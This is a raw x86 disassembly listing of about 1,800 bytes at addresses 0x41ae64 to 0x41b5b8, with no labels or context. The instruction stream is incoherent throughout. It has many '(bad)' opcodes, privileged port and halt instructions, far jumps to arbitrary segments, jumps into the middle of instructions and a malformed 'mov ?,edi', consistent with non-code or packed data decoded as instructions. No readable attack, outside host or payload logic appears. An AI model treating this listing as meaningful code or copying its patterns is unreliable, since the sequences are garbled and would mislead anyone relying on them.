  41ae64:	mov    dh,BYTE PTR ds:0x5389a41a
  41ae6a:	adc    BYTE PTR [edx-0x4e63fd5c],al
  41ae70:	mov    bl,0x4c
  41ae72:	mov    ebp,0xa3339fd6
  41ae77:	gs jp  0x41aea5
  41ae7a:	add    bh,BYTE PTR [ebx]
  41ae7c:	loope  0x41ae81
  41ae7e:	mov    BYTE PTR [edi-0x39c2125d],al
  41ae84:	push   ss
  41ae85:	mov    DWORD PTR [ecx-0x1f48c051],0x5b4ae488
  41ae8f:	pop    ebx
  41ae90:	addr16 and al,0xa6
  41ae93:	imul   ebp,esp,0xffffff93
  41ae96:	mov    ebx,0x72550915
  41ae9b:	mov    edx,es
  41ae9d:	push   eax
  41ae9e:	jl     0x41af1d
  41aea0:	rol    DWORD PTR [ecx-0x2c],0x92
  41aea4:	(bad)  
  41aea5:	pusha  
  41aea6:	in     al,0x65
  41aea8:	add    edi,ebx
  41aeaa:	push   ss
  41aeab:	sbb    bh,BYTE PTR [eax-0x1f]
  41aeae:	rcr    BYTE PTR [eax],0xa0
  41aeb1:	es sar eax,cl
  41aeb4:	(bad)
  41aeb7:	sbb    eax,0x89718270
  41aebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aebd:	mov    ecx,0x797d75
  41aec2:	repnz mov al,ds:0x9c73b84
  41aec8:	fimul  DWORD PTR [edi]
  41aeca:	aaa    
  41aecb:	and    al,0x78
  41aecd:	lds    ebx,FWORD PTR [esi-0x62]
  41aed0:	in     eax,dx
  41aed1:	jmp    0xa934b1a5
  41aed6:	adc    dh,bh
  41aed8:	shl    DWORD PTR [ecx+0x7aefa067],1
  41aede:	pushf  
  41aedf:	cmp    ebx,DWORD PTR [esi+edi*8+0x24]
  41aee3:	sahf   
  41aee4:	or     BYTE PTR [edi-0x2ec91617],ah
  41aeea:	in     al,0xb3
  41aeec:	scas   eax,DWORD PTR es:[edi]
  41aeed:	jmp    0x8533:0x784bad9a
  41aef4:	inc    esi
  41aef5:	xchg   ebp,eax
  41aef6:	lods   eax,DWORD PTR ds:[esi]
  41aef7:	sbb    ebx,DWORD PTR [eax]
  41aef9:	fsub   QWORD PTR ds:0xbad987a1
  41aeff:	xchg   DWORD PTR ds:0x3f1bf03c,edx
  41af05:	xor    BYTE PTR [esp+edx*4],0xaf
  41af09:	imul   ebx,DWORD PTR [ebp-0x4c7b8e8c],0x39
  41af10:	iret   
  41af11:	or     DWORD PTR [eax+eax*2+0x1b],ebp
  41af15:	retf   0x43cd
  41af18:	inc    edi
  41af19:	cmp    eax,0x80e7008f
  41af1e:	pop    edi
  41af1f:	gs sahf 
  41af21:	lea    ebx,[ecx+0x31]
  41af24:	xchg   ebx,eax
  41af25:	pop    ss
  41af26:	test   ch,ch
  41af28:	and    BYTE PTR [ecx+0x2],bh
  41af2b:	inc    esp
  41af2c:	xor    ebx,eax
  41af2e:	cmp    esi,ebx
  41af30:	in     al,0x3b
  41af32:	scas   eax,DWORD PTR es:[edi]
  41af33:	pop    eax
  41af34:	out    0x2a,eax
  41af36:	and    ebp,esi
  41af38:	int    0x94
  41af3a:	xor    eax,0x1489a3f6
  41af3f:	(bad)  
  41af40:	pop    ebx
  41af41:	sbb    ebx,esi
  41af43:	jnp    0x41af43
  41af45:	xor    al,0x3f
  41af47:	(bad)  
  41af48:	mov    esp,0x5f5c6e35
  41af4d:	dec    eax
  41af4e:	fld    QWORD PTR [edx+0x778dcaea]
  41af54:	mov    esp,0x8b4c7618
  41af59:	mov    eax,ds:0xd608fea3
  41af5e:	scas   eax,DWORD PTR es:[edi]
  41af5f:	xlat   BYTE PTR ds:[ebx]
  41af60:	add    cl,BYTE PTR [eax-0x2b]
  41af63:	sbb    eax,0x8ad7fc6f
  41af68:	or     al,0x3c
  41af6a:	js     0x41af3f
  41af6c:	pop    ebp
  41af6d:	(bad)  
  41af6e:	sub    DWORD PTR [eax-0x1703999],esi
  41af74:	sub    al,0x92
  41af76:	sub    BYTE PTR [eax+eiz*8],dh
  41af79:	sub    eax,0xd024ac7c
  41af7e:	cmp    dh,al
  41af80:	jne    0x41af81
  41af82:	and    ebx,edi
  41af84:	hlt    
  41af85:	jnp    0x41afcc
  41af87:	mov    bh,ah
  41af89:	sub    BYTE PTR [edx+eax*8],ah
  41af8c:	in     al,0x8e
  41af8e:	hlt    
  41af8f:	jns    0x815fec9f
  41af95:	pop    eax
  41af96:	out    dx,al
  41af97:	sti    
  41af98:	inc    esp
  41af99:	adc    al,0x70
  41af9b:	ds push ecx
  41af9d:	pop    es
  41af9e:	hlt    
  41af9f:	xor    BYTE PTR [ecx+0x24],0x45
  41afa3:	sahf   
  41afa4:	xchg   bl,dh
  41afa6:	and    eax,0x3cdd60f5
  41afab:	inc    ebp
  41afac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afad:	cwde   
  41afae:	cmp    cl,BYTE PTR [ecx+0x730114d3]
  41afb4:	dec    ebp
  41afb5:	loopne 0x41afc7
  41afb7:	and    edx,ebx
  41afb9:	mov    BYTE PTR [ecx],bh
  41afbb:	scas   eax,DWORD PTR es:[edi]
  41afbc:	nop
  41afbd:	std    
  41afbe:	jmp    0x41afb2
  41afc0:	sbb    al,0xa6
  41afc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afc3:	mov    cl,0x95
  41afc5:	sbb    BYTE PTR [edx],dh
  41afc7:	fs xor al,0xa2
  41afca:	xchg   edi,eax
  41afcb:	jo     0x41b002
  41afcd:	xchg   ebx,eax
  41afce:	aas    
  41afcf:	sub    edi,DWORD PTR [edx]
  41afd1:	cdq    
  41afd2:	in     eax,dx
  41afd3:	(bad)  
  41afd4:	mov    dh,0x21
  41afd6:	jp     0x41afa6
  41afd8:	add    eax,0xaed063fa
  41afdd:	outs   dx,DWORD PTR ds:[esi]
  41afde:	test   eax,0x91efb3d8
  41afe3:	loop   0x41afb0
  41afe5:	lds    edx,FWORD PTR [edx]
  41afe7:	rcr    BYTE PTR [edx],cl
  41afe9:	jecxz  0x41b017
  41afeb:	push   esi
  41afec:	jecxz  0x41afdd
  41afee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afef:	xlat   BYTE PTR ds:[ebx]
  41aff0:	lds    esi,FWORD PTR [edi+0x198049ca]
  41aff6:	sbb    ebx,DWORD PTR [ecx-0x611aaae6]
  41affc:	(bad)  
  41affd:	xchg   esp,eax
  41affe:	adc    dh,BYTE PTR [ecx]
  41b000:	adc    esi,eax
  41b002:	mov    dh,0x2d
  41b004:	cdq    
  41b005:	dec    ebx
  41b006:	fsubr  DWORD PTR [edi+0x2bb9bd33]
  41b00c:	and    eax,0x7ef76546
  41b011:	cmp    DWORD PTR [edi-0x6b],0xffffffcf
  41b015:	jmp    0x41afb0
  41b017:	call   0x871fa63a
  41b01c:	cmc    
  41b01d:	sbb    eax,0x7a2acaa1
  41b022:	(bad)  
  41b023:	lahf   
  41b024:	mov    bl,0xed
  41b026:	std    
  41b027:	int3   
  41b028:	xchg   esi,eax
  41b029:	and    DWORD PTR [edx+0x5a],0xffffffd2
  41b02d:	lea    ebx,[eax+0x3c]
  41b030:	mov    dh,0x19
  41b032:	sbb    BYTE PTR [ecx+ecx*4],ah
  41b035:	dec    edx
  41b036:	lds    ebp,FWORD PTR [ecx]
  41b038:	pop    es
  41b039:	cmp    BYTE PTR [ebx],ah
  41b03b:	cwde   
  41b03c:	jp     0x41b0b7
  41b03e:	cmc    
  41b03f:	je     0x41b0b5
  41b041:	imul   ebp,esp,0xffffffc6
  41b044:	pop    esi
  41b045:	ret    0x443b
  41b048:	inc    edx
  41b049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b04a:	retf   
  41b04b:	mov    ch,0x18
  41b04d:	ret    0x3668
  41b050:	dec    ecx
  41b051:	in     eax,dx
  41b052:	gs push eax
  41b054:	pop    eax
  41b055:	xor    dl,BYTE PTR [ebp+0x5]
  41b058:	adc    al,0x51
  41b05a:	push   es
  41b05b:	jns    0x41b019
  41b05d:	push   ss
  41b05e:	push   ss
  41b05f:	ins    DWORD PTR es:[edi],dx
  41b060:	adc    ebp,ecx
  41b062:	imul   ebp,ebp,0x1b
  41b065:	and    BYTE PTR [esi-0x10],ah
  41b068:	hlt    
  41b069:	mov    gs,WORD PTR [edx]
  41b06b:	push   ebp
  41b06c:	test   eax,0xfdd43474
  41b071:	jle    0x41b02c
  41b073:	and    cl,BYTE PTR [edi+ebx*8-0x1cd460b3]
  41b07a:	popa   
  41b07b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b07c:	add    dl,BYTE PTR [ebp-0x60f8d7ec]
  41b082:	add    ebx,ebx
  41b084:	push   es
  41b085:	push   ss
  41b086:	pop    esp
  41b087:	scas   eax,DWORD PTR es:[edi]
  41b088:	mov    bh,0x6c
  41b08a:	push   ebx
  41b08b:	add    eax,0x523566a5
  41b090:	hlt    
  41b091:	inc    eax
  41b092:	add    ebp,eax
  41b094:	push   cs
  41b095:	pop    ecx
  41b096:	aaa    
  41b097:	pop    edi
  41b098:	into   
  41b099:	or     ebp,0x77d22fb3
  41b09f:	xor    edi,DWORD PTR [edi+ebx*1-0x70]
  41b0a3:	hlt    
  41b0a4:	or     BYTE PTR [ecx+0x2e3787ef],dl
  41b0aa:	xor    BYTE PTR [ebp+eax*2-0x70],0x68
  41b0af:	int    0x6d
  41b0b1:	mov    esp,0x7eadd7e0
  41b0b6:	cmp    BYTE PTR [edx+0x5],0x7d
  41b0ba:	xlat   BYTE PTR ds:[ebx]
  41b0bb:	fs dec esi
  41b0bd:	je     0x41b08b
  41b0bf:	stos   BYTE PTR es:[edi],al
  41b0c0:	xchg   ebp,eax
  41b0c1:	pop    ebp
  41b0c2:	mov    edx,0x3a759feb
  41b0c7:	push   edi
  41b0c8:	xor    al,0xd7
  41b0ca:	ds xchg ebp,eax
  41b0cc:	mov    dl,0xb1
  41b0ce:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b0d0:	xchg   DWORD PTR [edx+0xbd56d7e],esp
  41b0d6:	popa   
  41b0d7:	lds    esi,FWORD PTR [ebx+eiz*8]
  41b0da:	push   eax
  41b0db:	push   cs
  41b0dc:	retf   
  41b0dd:	fxch   st(0)
  41b0df:	ret    0xa16b
  41b0e2:	adc    edi,ecx
  41b0e4:	sbb    DWORD PTR [edx-0x3a648646],ecx
  41b0ea:	mov    esi,0x6b63ad18
  41b0ef:	inc    edi
  41b0f0:	test   BYTE PTR [eax+0x11],ah
  41b0f3:	jno    0x41b163
  41b0f5:	adc    eax,0x7f31e25f
  41b0fa:	js     0x41b105
  41b0fc:	mov    ah,0x39
  41b0fe:	sar    BYTE PTR [ebx],0xc4
  41b101:	mov    edi,0x3d129e15
  41b106:	push   ebp
  41b107:	jg     0x41b185
  41b109:	push   esp
  41b10a:	int    0xea
  41b10c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b10d:	jle    0x41b09a
  41b10f:	jb     0x41b103
  41b111:	mov    al,ds:0xdad0efc4
  41b116:	call   0x67d7d81b
  41b11b:	(bad)  
  41b11c:	mov    ebp,0x611b74fd
  41b121:	and    eax,0xb4954c3c
  41b126:	stos   BYTE PTR es:[edi],al
  41b127:	icebp  
  41b128:	xor    BYTE PTR [edi-0x67f3b59c],0x79
  41b12f:	dec    ebx
  41b130:	mov    bh,0x31
  41b132:	mov    bl,0x50
  41b134:	stos   DWORD PTR es:[edi],eax
  41b135:	sbb    al,0x66
  41b137:	dec    eax
  41b138:	retf   
  41b139:	mov    WORD PTR [edi+0x143046ba],gs
  41b13f:	retf   
  41b140:	fsubr  DWORD PTR [ebp+0x2437b158]
  41b146:	and    edi,ecx
  41b148:	adc    DWORD PTR [ecx-0x768a2181],eax
  41b14e:	jb     0x41b1c7
  41b150:	cmp    DWORD PTR [esi+0x5de4f4c2],eax
  41b156:	xor    BYTE PTR [ecx-0x509e442e],al
  41b15c:	lods   al,BYTE PTR ds:[si]
  41b15e:	xor    bh,BYTE PTR [ecx+0x9de1970]
  41b164:	int    0xe1
  41b166:	push   ebp
  41b167:	adc    esp,DWORD PTR [ebx+0xb]
  41b16a:	xor    DWORD PTR [eax+0x59],esi
  41b16d:	dec    ecx
  41b16e:	mov    ch,0x3d
  41b170:	xor    DWORD PTR [ebx-0x40],esp
  41b173:	fisubr WORD PTR [esi+eiz*8+0x3a]
  41b177:	nop
  41b178:	or     DWORD PTR [ecx-0x22],ebp
  41b17b:	fs dec eax
  41b17d:	cld    
  41b17e:	jmp    0x41b145
  41b180:	sub    BYTE PTR [eax],bh
  41b182:	call   0x9c05:0x36839ff3
  41b189:	in     al,0x39
  41b18b:	sbb    DWORD PTR [ebp-0x5e31706d],esi
  41b191:	sub    ah,BYTE PTR [ebx-0x1a015e45]
  41b197:	imul   bl
  41b199:	pop    ebx
  41b19a:	jmp    0x90f2:0x55a6b927
  41b1a1:	dec    edx
  41b1a2:	in     al,dx
  41b1a3:	adc    al,0x2a
  41b1a5:	test   eax,0x9d4e84f1
  41b1aa:	test   al,0xd0
  41b1ac:	pop    es
  41b1ad:	mov    edx,0x68622360
  41b1b2:	pop    eax
  41b1b3:	pop    ds
  41b1b4:	outs   dx,DWORD PTR ds:[esi]
  41b1b5:	xor    DWORD PTR [ebx+0x665e4647],ebp
  41b1bb:	sbb    BYTE PTR [esi-0x2d],ah
  41b1be:	cmp    BYTE PTR [ebx+0xbcb8d96],dh
  41b1c4:	sar    BYTE PTR [ebx+ecx*1+0x394a0a4d],cl
  41b1cb:	ja     0x41b18a
  41b1cd:	call   0x1bc700bb
  41b1d2:	int    0xa3
  41b1d4:	jnp    0x41b227
  41b1d6:	mov    edi,0xb151e3d1
  41b1db:	push   0x2fe7f8a4
  41b1e0:	fcmovnb st,st(2)
  41b1e2:	ins    DWORD PTR es:[edi],dx
  41b1e3:	lds    ecx,FWORD PTR [ebp+0x34]
  41b1e6:	rol    DWORD PTR [eax+ebp*1-0x2],cl
  41b1ea:	ret    
  41b1eb:	mov    ebx,0x7481ad8c
  41b1f0:	adc    DWORD PTR [ebp+0x7],ecx
  41b1f3:	lods   eax,DWORD PTR ds:[esi]
  41b1f4:	or     edx,DWORD PTR [edi+0x302d7923]
  41b1fa:	jg     0x41b26f
  41b1fc:	sbb    BYTE PTR [eax+0x1ca1d5c],0xbb
  41b203:	jne    0x41b26f
  41b205:	jb     0x41b20b
  41b207:	pop    edi
  41b208:	xchg   esi,eax
  41b209:	mov    esi,0x1ed9c2ae
  41b20e:	dec    ecx
  41b20f:	(bad)  
  41b210:	aaa    
  41b211:	cmp    al,dh
  41b213:	push   eax
  41b214:	xor    BYTE PTR [esi+0x27205424],ch
  41b21a:	imul   edx,eax,0xffffffe4
  41b21d:	dec    esi
  41b21e:	in     eax,0xae
  41b220:	xchg   dh,bh
  41b222:	mov    ds:0xf2d64d7e,al
  41b227:	addr16 pop ecx
  41b229:	add    BYTE PTR [eax-0x6eab5b70],bl
  41b22f:	mov    WORD PTR [edi],es
  41b231:	sub    dh,0x2c
  41b234:	dec    esp
  41b235:	retf   
  41b236:	ins    BYTE PTR es:[edi],dx
  41b237:	cdq    
  41b238:	cdq    
  41b239:	in     eax,0x9d
  41b23b:	xchg   edx,eax
  41b23c:	jge    0x41b2a4
  41b23e:	push   0xffffffac
  41b240:	inc    edi
  41b241:	lds    esi,FWORD PTR [eax+ebx*8-0x1cde1c33]
  41b248:	stmxcsr DWORD PTR [esi]
  41b24b:	jno    0x41b24c
  41b24d:	or     BYTE PTR [ebp-0x13],bl
  41b250:	inc    edx
  41b251:	loop   0x41b26b
  41b253:	pop    ds
  41b254:	fbstp  TBYTE PTR [edi+0x6b]
  41b257:	jns    0x41b2c3
  41b259:	push   ebx
  41b25a:	je     0x41b21a
  41b25c:	daa    
  41b25d:	jo     0x41b1e3
  41b25f:	push   ss
  41b260:	push   es
  41b261:	mov    ch,0xba
  41b263:	imul   ebp,DWORD PTR [ebp-0x5c595cea],0xffffff91
  41b26a:	stos   BYTE PTR es:[edi],al
  41b26b:	pop    edi
  41b26c:	test   DWORD PTR [edi],edi
  41b26e:	fld    TBYTE PTR [ebx+0x3a]
  41b271:	popa   
  41b272:	rol    al,0x49
  41b275:	jmp    0xe2d3:0x67277620
  41b27c:	pop    es
  41b27d:	pusha  
  41b27e:	mov    bh,0x30
  41b280:	sbb    al,0x77
  41b282:	xchg   ebx,eax
  41b283:	fnop   
  41b285:	jno    0x41b241
  41b287:	or     eax,0x3bb32b56
  41b28c:	fwait
  41b28d:	popa   
  41b28e:	xchg   BYTE PTR [ecx+eax*1-0x51],dl
  41b292:	pop    ebp
  41b293:	xchg   BYTE PTR [ecx],cl
  41b295:	int3   
  41b296:	sbb    eax,0xcdb410f0
  41b29b:	push   ds
  41b29c:	test   eax,0x6a7edf91
  41b2a1:	fdivr  DWORD PTR [eax-0x1]
  41b2a4:	stc    
  41b2a5:	iret   
  41b2a6:	pusha  
  41b2a7:	icebp  
  41b2a8:	and    al,0xd8
  41b2aa:	imul   DWORD PTR [esi+0x66705ac9]
  41b2b0:	mov    ebx,0x60bd1234
  41b2b5:	xchg   bh,cl
  41b2b7:	fld    TBYTE PTR [edx]
  41b2b9:	(bad)  
  41b2ba:	mov    bh,0x42
  41b2bc:	cmp    eax,DWORD PTR [esp+ebx*8]
  41b2bf:	or     esp,DWORD PTR [ebx+esi*4-0x6e]
  41b2c3:	hlt    
  41b2c4:	fmul   DWORD PTR [ecx+edi*2+0x14]
  41b2c8:	dec    ebp
  41b2c9:	stos   DWORD PTR es:[edi],eax
  41b2ca:	sub    al,0x6c
  41b2cc:	int3   
  41b2cd:	inc    esi
  41b2ce:	push   cs
  41b2cf:	mov    bl,0x48
  41b2d1:	mov    dh,0x92
  41b2d3:	aaa    
  41b2d4:	mov    BYTE PTR [edx-0x4304a57],cl
  41b2da:	cli    
  41b2db:	mov    bl,0x9c
  41b2dd:	lods   al,BYTE PTR ds:[esi]
  41b2de:	mov    ecx,0x7924e449
  41b2e3:	mov    esi,0xe8343bd6
  41b2e8:	sbb    al,0x67
  41b2ea:	pushf  
  41b2eb:	mov    fs,WORD PTR [esi+0x35]
  41b2ee:	nop
  41b2ef:	ret    
  41b2f0:	sbb    ebp,0x6e1e19dc
  41b2f6:	dec    edi
  41b2f7:	retf   
  41b2f8:	xor    eax,0x5bb2a4c6
  41b2fd:	ja     0x41b2d2
  41b2ff:	inc    esi
  41b300:	dec    ebp
  41b301:	push   es
  41b302:	sbb    esi,DWORD PTR [edx-0xd684969]
  41b308:	add    eax,0xa5ae55cd
  41b30d:	lods   eax,DWORD PTR ds:[esi]
  41b30e:	pop    ebx
  41b30f:	clts   
  41b311:	lea    eax,[ecx]
  41b313:	vpavgw ymm2,ymm0,YMMWORD PTR [esi+0x100d47d5]
  41b31b:	mov    ebx,0xa10097d8
  41b320:	adc    edi,DWORD PTR [ebx]
  41b322:	sub    BYTE PTR ds:0xdb9a4cb6,0x17
  41b329:	inc    eax
  41b32a:	xor    BYTE PTR [edx-0x25],ah
  41b32d:	fwait
  41b32e:	repz sbb esp,DWORD PTR gs:[ebx+0x55ff74b3]
  41b336:	push   esi
  41b337:	xor    bh,BYTE PTR [edx+0x1b38b906]
  41b33d:	sar    BYTE PTR [eax+ebx*2+0x10],0x4b
  41b342:	sbb    al,0x55
  41b344:	int3   
  41b345:	dec    esp
  41b346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b347:	mov    ch,0x44
  41b349:	popa   
  41b34a:	mov    ecx,esp
  41b34c:	into   
  41b34d:	gs or  ch,dl
  41b350:	imul   esi,DWORD PTR [edi+0x100758fb],0xc37169fd
  41b35a:	ror    BYTE PTR ds:0x921c7de9,1
  41b360:	push   ebp
  41b361:	xor    bl,ah
  41b363:	jle    0x41b3e4
  41b365:	jbe    0x41b3d3
  41b367:	jl     0x41b3db
  41b369:	fcomip st,st(3)
  41b36b:	enter  0x321e,0xfa
  41b36f:	shl    bl,0xdb
  41b372:	jo     0x41b399
  41b374:	xchg   ecx,eax
  41b375:	dec    esp
  41b376:	jge    0x41b3b8
  41b378:	xor    BYTE PTR [edi+0x5a561b80],ch
  41b37e:	mov    ah,dl
  41b380:	ror    DWORD PTR ds:0xdecbd44c,cl
  41b386:	cmp    DWORD PTR [eax-0x62d0bc4f],esp
  41b38c:	loop   0x41b37b
  41b38e:	inc    esp
  41b38f:	inc    ebp
  41b390:	mov    BYTE PTR [eax],ch
  41b392:	cmc    
  41b393:	sub    edx,DWORD PTR [ecx+0x16b8f564]
  41b399:	xor    edi,DWORD PTR [esi-0x92f7c18]
  41b39f:	cmp    DWORD PTR [eax-0x7cbc14e3],esp
  41b3a5:	xor    al,0x93
  41b3a7:	or     eax,0x92587eb4
  41b3ac:	icebp  
  41b3ad:	cld    
  41b3ae:	and    BYTE PTR [edi],0x37
  41b3b1:	sbb    eax,0x9dd7a394
  41b3b6:	sub    al,0xe1
  41b3b8:	fs js  0x41b3d9
  41b3bb:	popa   
  41b3bc:	adc    eax,0x202c52f7
  41b3c1:	test   dl,dl
  41b3c3:	xchg   bl,bl
  41b3c5:	or     edx,DWORD PTR [edx]
  41b3c7:	jecxz  0x41b39a
  41b3c9:	std    
  41b3ca:	(bad)  
  41b3cb:	icebp  
  41b3cc:	push   ebx
  41b3cd:	adc    bh,ch
  41b3cf:	push   edx
  41b3d0:	jo     0x41b392
  41b3d2:	push   ecx
  41b3d3:	(bad)  
  41b3d4:	out    dx,eax
  41b3d5:	lds    ecx,FWORD PTR [edi]
  41b3d7:	pop    esi
  41b3d8:	or     al,0xaf
  41b3da:	sub    bh,BYTE PTR [ebp+0x1c]
  41b3dd:	sub    eax,0x95fcb41
  41b3e2:	xlat   BYTE PTR ds:[ebx]
  41b3e3:	lods   al,BYTE PTR ds:[esi]
  41b3e4:	fld    QWORD PTR [edx]
  41b3e6:	fimul  WORD PTR [edi-0x1ac3aff]
  41b3ec:	mov    dl,0x1d
  41b3ee:	sub    eax,DWORD PTR ds:0x76733f08
  41b3f4:	and    bl,BYTE PTR [ebx+0x4a7c663a]
  41b3fa:	(bad)  
  41b3fb:	sbb    DWORD PTR [ecx+eax*1],esi
  41b3fe:	inc    edi
  41b3ff:	cmp    DWORD PTR [esi+0x1f],ecx
  41b402:	repz aas 
  41b404:	jne    0x41b3fe
  41b406:	jns    0x41b47a
  41b408:	inc    ebx
  41b409:	or     esp,edx
  41b40b:	lds    ecx,FWORD PTR [edx]
  41b40d:	push   0x3974fa8b
  41b412:	sbb    ecx,DWORD PTR [edi]
  41b414:	mov    ds:0x1fb29a86,al
  41b419:	dec    edx
  41b41a:	jp     0x41b474
  41b41c:	fcmovbe st,st(4)
  41b41e:	dec    ecx
  41b41f:	shr    ecx,0xd6
  41b422:	jmp    0x41b414
  41b424:	fbstp  TBYTE PTR [ecx]
  41b426:	sbb    edx,edi
  41b428:	sbb    bh,dh
  41b42a:	mov    esp,0x9e8c1697
  41b42f:	fsubr  DWORD PTR [edx]
  41b431:	out    dx,al
  41b432:	cdq    
  41b433:	cdq    
  41b434:	and    eax,0x64042ed2
  41b439:	mov    ?,edi
  41b43b:	push   ecx
  41b43c:	cdq    
  41b43d:	mov    esi,0xcd94cd92
  41b442:	lods   eax,DWORD PTR ds:[esi]
  41b443:	aas    
  41b444:	retf   
  41b445:	xor    bh,cl
  41b447:	ds aad 0xe7
  41b44a:	scas   al,BYTE PTR es:[edi]
  41b44b:	mov    dh,0xb7
  41b44d:	xor    eax,0x3692157f
  41b452:	xchg   esp,eax
  41b453:	cs pop ss
  41b455:	jp     0x41b49e
  41b457:	imul   esi,ebx,0xffffff8f
  41b45a:	or     DWORD PTR [edi+eax*1-0x3d9217d1],ecx
  41b461:	pop    es
  41b462:	sub    BYTE PTR [edx+0x3f4afdd3],al
  41b468:	lods   al,BYTE PTR ds:[esi]
  41b469:	ins    BYTE PTR es:[edi],dx
  41b46a:	cld    
  41b46b:	xor    edx,0x56
  41b46e:	push   esi
  41b46f:	sbb    DWORD PTR [ecx],edx
  41b471:	fcomp  DWORD PTR [edi]
  41b473:	inc    esp
  41b474:	rol    DWORD PTR [edi+0x1e],cl
  41b477:	xor    eax,0xf4677372
  41b47c:	dec    ecx
  41b47d:	dec    ecx
  41b47e:	add    DWORD PTR [esp+edx*8+0x4c40ddb3],esi
  41b485:	enter  0xc53f,0x95
  41b489:	mov    ecx,0x24f5019
  41b48e:	in     ax,dx
  41b490:	shl    BYTE PTR [edx-0x9],1
  41b493:	and    al,0x6a
  41b495:	xchg   ebx,eax
  41b496:	in     al,dx
  41b497:	and    DWORD PTR [edx+0x3076d39f],0x5b
  41b49e:	popa   
  41b49f:	(bad)  
  41b4a0:	fnstsw WORD PTR [ebx+eax*1+0x17]
  41b4a4:	mov    esi,0x429b5778
  41b4a9:	adc    bh,BYTE PTR [edi-0x80]
  41b4ac:	loope  0x41b4df
  41b4ae:	fcom   DWORD PTR [eax-0x58]
  41b4b1:	pop    ebp
  41b4b2:	daa    
  41b4b3:	call   0x78f42356
  41b4b8:	fdivp  st(0),st
  41b4ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4bb:	(bad)  
  41b4bc:	hlt    
  41b4bd:	mov    WORD PTR [ecx+0x51899cc6],cs
  41b4c3:	xor    eax,0xd412a5c2
  41b4c8:	fwait
  41b4c9:	push   esi
  41b4ca:	in     eax,dx
  41b4cb:	jg     0x41b459
  41b4cd:	or     al,0x94
  41b4cf:	dec    eax
  41b4d0:	popf   
  41b4d1:	jb     0x41b540
  41b4d3:	stos   DWORD PTR es:[edi],eax
  41b4d4:	add    al,0xe1
  41b4d6:	jg     0x41b52d
  41b4d8:	stos   DWORD PTR es:[edi],eax
  41b4d9:	mov    ah,0xd4
  41b4db:	sbb    ecx,DWORD PTR [ebp+0x208a210b]
  41b4e1:	dec    ebx
  41b4e2:	std    
  41b4e3:	out    0xab,al
  41b4e5:	adc    ecx,DWORD PTR [eax]
  41b4e7:	adc    eax,0xa57e0146
  41b4ec:	call   0x86f76ee3
  41b4f1:	jno    0x41b52f
  41b4f3:	test   ah,ch
  41b4f5:	je     0x41b4f9
  41b4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4f8:	int3   
  41b4f9:	jmp    0x41b55f
  41b4fb:	push   eax
  41b4fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4fd:	repz loopne 0x41b4e4
  41b500:	std    
  41b501:	dec    edi
  41b502:	leave  
  41b503:	lock es sbb al,0xe5
  41b507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b508:	aaa    
  41b509:	(bad)  
  41b50a:	clc    
  41b50b:	data16 ror BYTE PTR [esi-0xd],0x5
  41b510:	sahf   
  41b511:	xchg   ecx,eax
  41b512:	iret   
  41b513:	sahf   
  41b514:	bound  ebx,QWORD PTR [esi]
  41b516:	jo     0x41b595
  41b518:	add    BYTE PTR [ecx-0x347440a9],dl
  41b51e:	sahf   
  41b51f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b520:	ss mov al,0xfe
  41b523:	aam    0xa8
  41b525:	jns    0x41b4b9
  41b527:	pop    ebx
  41b528:	bound  esi,QWORD PTR [ecx]
  41b52a:	(bad)  
  41b52b:	cmp    esi,DWORD PTR [ebx]
  41b52d:	mov    bh,0xf9
  41b52f:	ret    0x7ba4
  41b532:	push   ds
  41b533:	out    dx,eax
  41b534:	adc    al,0x32
  41b536:	xchg   esp,eax
  41b537:	cmp    DWORD PTR [ebx-0x14],ecx
  41b53a:	fidiv  WORD PTR [edx-0x63]
  41b53d:	dec    esi
  41b53e:	aaa    
  41b53f:	dec    eax
  41b540:	jbe    0x41b552
  41b542:	mov    DWORD PTR [esi+0x2d],edx
  41b545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b546:	sbb    ebp,edx
  41b548:	rep outs dx,BYTE PTR ds:[esi]
  41b54a:	lods   al,BYTE PTR ds:[esi]
  41b54b:	pop    esi
  41b54c:	pop    ecx
  41b54d:	mov    eax,0xbf53c2ec
  41b552:	mov    DWORD PTR [ecx],ebx
  41b554:	xor    esi,DWORD PTR [esi-0x49946af1]
  41b55a:	leave  
  41b55b:	pop    edx
  41b55c:	pusha  
  41b55d:	(bad)  
  41b55e:	fiadd  DWORD PTR [edx+ecx*1]
  41b561:	cs test al,0x96
  41b564:	push   es
  41b565:	mov    edx,DWORD PTR [esi-0x71]
  41b568:	das    
  41b569:	fistp  QWORD PTR [edi]
  41b56b:	loop   0x41b537
  41b56d:	popf   
  41b56e:	inc    esi
  41b56f:	mov    ch,0x59
  41b571:	dec    edi
  41b572:	dec    edx
  41b573:	mov    al,ds:0xead9925a
  41b578:	mov    dh,0x95
  41b57a:	cmp    dl,BYTE PTR [edi-0x45]
  41b57d:	inc    edi
  41b57e:	sbb    eax,0x821c6fe8
  41b583:	aad    0xed
  41b585:	adc    ebp,DWORD PTR [edx-0x4fd328ba]
  41b58b:	idiv   ebx
  41b58d:	int    0x11
  41b58f:	fdiv   QWORD PTR [eax]
  41b591:	xor    BYTE PTR [ebp+0x6b77c4c5],ch
  41b597:	loop   0x41b581
  41b599:	xor    dl,bh
  41b59b:	out    dx,al
  41b59c:	lahf   
  41b59d:	dec    ebx
  41b59e:	call   0x28b0f8b7
  41b5a3:	cli    
  41b5a4:	push   ebp
  41b5a5:	in     eax,0x2
  41b5a7:	cmp    esp,DWORD PTR [edx-0x454096d]
  41b5ad:	or     dl,BYTE PTR [ebx]
  41b5af:	pop    ebp
  41b5b0:	jne    0x41b572
  41b5b2:	sub    BYTE PTR ds:0x2e60947e,bl
  41b5b8:	inc    eax
